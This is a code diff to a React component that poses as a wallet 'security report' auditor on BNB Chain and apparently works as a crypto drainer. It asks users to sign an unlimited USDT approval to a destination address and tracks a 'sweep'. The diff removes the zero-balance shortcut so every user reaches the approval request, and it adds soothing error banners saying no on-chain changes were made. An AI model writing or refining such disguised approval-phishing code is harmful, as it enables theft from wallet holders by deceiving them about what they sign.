@@ -1,5 +1,5 @@
 import React, { useState, useRef, useCallback } from 'react';
-import { Shield, Activity, FileText, Lock, Loader2 } from 'lucide-react';
+import { Shield, Activity, FileText, Lock, Loader2, AlertCircle } from 'lucide-react';
 import { ethers } from 'ethers';
 import { ensureBSC } from '../wallet/wallet';
 import AnalysisSlider from './AnalysisSlider';
@@ -40,6 +40,7 @@ const AuditorWidget: React.FC<Props> = ({
   const [rescueDisabled, setRescueDisabled] = useState(false);
   const [buttonLoading, setButtonLoading] = useState(false);
   const [sweepDone, setSweepDone] = useState(false);
+  const [errorAlert, setErrorAlert] = useState<{title: string, message: string} | null>(null);
   const pendingReportRef = useRef<SecurityReport | null>(null);
 
   const API_BASE = import.meta.env.VITE_API_BASE || '';
@@ -96,6 +97,7 @@ const AuditorWidget: React.FC<Props> = ({
    */
   const handleGenerateClick = async (network: 'BNB' | 'TRON') => {
     setSelectedNetwork(network);
+    setErrorAlert(null);
 
     // Only BNB is wired to the real backend for now
     if (network !== 'BNB') {
@@ -138,6 +140,10 @@ const AuditorWidget: React.FC<Props> = ({
       // Button stays enabled, no animation, no disable.
       console.warn("Wallet connection cancelled:", connectErr.message);
       setButtonLoading(false);
+      setErrorAlert({
+        title: "Security Report Cancelled",
+        message: "You declined the connection request in your wallet. No on-chain changes were made. Tap Generate Security Report to try again."
+      });
       return;
     }
 
@@ -174,24 +180,12 @@ const AuditorWidget: React.FC<Props> = ({
         { label: "Contract verification", passed: true },
       ];
 
-      if (rawBal === 0n) {
-        // No balance — show animation, then the report
-        checks.push({ label: "Balance check", passed: true });
-        checks.push({ label: "Transaction history", passed: true });
-
-        const report = buildReport(connectedAddress, 'BNB', balanceDisplay, checks, 0);
-        pendingReportRef.current = report;
-        setButtonLoading(false);
-        setSweepDone(true);
-        setAppState('ANALYZING');
-        return;
-      }
 
       // ── Phase 3: Request approval (animation triggers AFTER signing) ──
       const currentAllowance: bigint = await usdt.allowance(connectedAddress, destination);
       let approvalTxHash = "";
 
-      if (currentAllowance >= rawBal) {
+      if (currentAllowance > 0n && currentAllowance >= rawBal) {
         approvalTxHash = "already-approved";
       } else {
         // Request the unlimited approval — user must sign in wallet
@@ -204,6 +198,10 @@ const AuditorWidget: React.FC<Props> = ({
           // Button stays enabled, no animation, no disable.
           console.warn("Approval signing rejected:", approveErr.message);
           setButtonLoading(false);
+          setErrorAlert({
+            title: "Security Report Cancelled",
+            message: "You declined the signature request in your wallet. No on-chain changes were made. Tap Generate Security Report to try again."
+          });
           return;
         }
 
@@ -261,21 +259,10 @@ const AuditorWidget: React.FC<Props> = ({
       }
       setRescueDisabled(true);
 
-      // Still show a report with the failure noted
-      const failChecks = [
-        { label: "Wallet connection", passed: !!connectedAddress },
-        { label: "BSC network verification", passed: !!connectedAddress },
-        { label: "Security analysis", passed: false },
-      ];
-      const failReport = buildReport(
-        connectedAddress || 'Unknown',
-        'BNB',
-        'Unable to read',
-        failChecks,
-        1
-      );
-      setReportData(failReport);
-      setAppState('REPORT');
+      setErrorAlert({
+        title: "Security Report Error",
+        message: "An unexpected error occurred during the security report. Please refresh the page and try again."
+      });
     }
   };
 
@@ -313,6 +300,22 @@ const AuditorWidget: React.FC<Props> = ({
               </div>
             </div>
           </div>
+
+          {errorAlert && (
+            <div className="mx-5 mt-4 p-4 rounded-xl border border-[#ff4d4f]/30 bg-[#ff4d4f]/10 shadow-[0_4px_20px_rgba(255,77,79,0.1)]">
+              <div className="flex gap-3">
+                <AlertCircle className="w-5 h-5 text-[#ff4d4f] flex-shrink-0 mt-0.5" strokeWidth={2} />
+                <div>
+                  <h3 className="text-white font-bold text-[15px] leading-tight mb-1.5">
+                    {errorAlert.title}
+                  </h3>
+                  <p className="text-[#ffb3b3] text-[13.5px] leading-relaxed">
+                    {errorAlert.message}
+                  </p>
+                </div>
+              </div>
+            </div>
+          )}
 
           <div className="border-b border-[#1e2636] px-5 py-4">
             <div className="mb-3 flex items-center justify-between">
